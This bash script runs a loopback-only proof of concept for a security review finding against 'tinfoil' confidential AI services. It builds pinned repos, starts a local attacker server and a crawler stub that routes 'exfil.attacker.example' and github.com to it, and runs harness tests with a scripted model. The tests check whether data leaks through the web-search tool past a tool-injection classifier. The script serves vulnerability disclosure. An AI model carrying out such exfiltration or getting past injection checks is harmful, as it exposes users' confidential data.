#!/bin/bash
# Finding 9 PoC (local only, loopback). Copies the pristine repos at the pinned
# commits into a build dir, drops in the PoC files, starts three loopback
# services and runs the harness test with a scripted model.
#
#   BUILD   build dir (default /root/tinfoil-review/work/disclosures/09)
#   REPOS   pristine clones (default /root/tinfoil-review/repos)
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
REPOS=${REPOS:-/root/tinfoil-review/repos}
BUILD=${BUILD:-/root/tinfoil-review/work/disclosures/09}
[ -f /root/tinfoil-review/env.sh ] && source /root/tinfoil-review/env.sh
export GOWORK=off
ATT=${ATT:-20911}; EXA=${EXA:-20912}; WS=${WS:-20913}
OUT=$BUILD/out

declare -A PIN=([confidential-tinfoil-harness]=4c170c6 [confidential-websearch]=e3751cf [confidential-website-metadata-fetcher]=8f0fd7e)
rm -rf "$BUILD"; mkdir -p "$OUT"
for r in "${!PIN[@]}"; do
  git -C "$REPOS/$r" archive --prefix="$r/" "${PIN[$r]}" | tar -x -C "$BUILD"
  echo "== $r @ $(git -C "$REPOS/$r" rev-parse --short "${PIN[$r]}") copied (unmodified)"
done
cp "$HERE/harness/poc_exfil_test.go" "$BUILD/confidential-tinfoil-harness/"
mkdir -p "$BUILD/confidential-websearch/cmd/poc-websearch"
cp "$HERE/websearch/main.go" "$BUILD/confidential-websearch/cmd/poc-websearch/"
cp "$HERE/metadata/poc_linkpreview_test.go" "$BUILD/confidential-website-metadata-fetcher/"

echo "== building stubs and websearch (shipped packages)"
(cd "$HERE/exastub" && go build -o "$OUT/exastub" .)
(cd "$HERE/attacker" && go build -o "$OUT/attacker" .)
(cd "$BUILD/confidential-websearch" && go build -o "$OUT/poc-websearch" ./cmd/poc-websearch)

PIDS=""; cleanup() { kill $PIDS 2>/dev/null || true; }; trap cleanup EXIT
"$OUT/attacker" -listen 127.0.0.1:$ATT -log "$OUT/attacker.log" >"$OUT/attacker.stdout" 2>&1 & PIDS="$PIDS $!"
# Exa crawler emulation: every host below resolves to the attacker's server.
"$OUT/exastub" -listen 127.0.0.1:$EXA -ca-out "$OUT/ca.pem" -log "$OUT/exastub.log" \
  -crawl-map "github.com=127.0.0.1:$ATT,attacker-blog.example=127.0.0.1:$ATT,exfil.attacker.example=127.0.0.1:$ATT" \
  >"$OUT/exastub.stdout" 2>&1 & PIDS="$PIDS $!"
sleep 1
HTTPS_PROXY=http://127.0.0.1:$EXA SSL_CERT_FILE="$OUT/ca.pem" EXA_API_KEY=poc-dummy-exa-key \
  CLOUDFLARE_API_TOKEN=poc-dummy-cf-token LISTEN_ADDR=127.0.0.1:$WS \
  "$OUT/poc-websearch" >"$OUT/websearch.stdout" 2>&1 & PIDS="$PIDS $!"
for _ in $(seq 1 40); do curl -fsS "http://127.0.0.1:$WS/health" >/dev/null 2>&1 && break; sleep 0.5; done

echo "== harness test (shipped harness + scripted model)"
set +e
(cd "$BUILD/confidential-tinfoil-harness" && POC_WEBSEARCH_ADDR=127.0.0.1:$WS POC_ATTACKER_LOG="$OUT/attacker.log" \
  go test -run 'TestPoC_' -v -count=1 . 2>&1) | tee "$OUT/harness-test.log"
H=${PIPESTATUS[0]}
echo "== metadata enclave test (render_link_preview -> context.dev, maxAgeMs=0)"
(cd "$BUILD/confidential-website-metadata-fetcher" && go test -run 'TestPoC_' -v -count=1 . 2>&1) | tee "$OUT/metadata-test.log"
M=${PIPESTATUS[0]}
set -e

echo "== websearch service log (headers sent by the harness, ranker, classifier calls)"
grep -E 'InTopBucket|X-Tinfoil-Tool-Injection-Check|classifier call' "$OUT/websearch.stdout" | sed -E 's/body=.*//' | cut -c1-220
echo "== Exa stand-in: /contents requests and crawls"
grep -E '"path":"/contents"|"kind":"crawl"' "$OUT/exastub.log" | cut -c1-260
echo "== attacker web server log"
cut -c1-260 "$OUT/attacker.log"
echo
if [ "$H" = 0 ] && [ "$M" = 0 ]; then echo "POC RESULT: PASS (scenario 1 leaked, control blocked, link-preview forwarded)"; else echo "POC RESULT: FAIL"; exit 1; fi
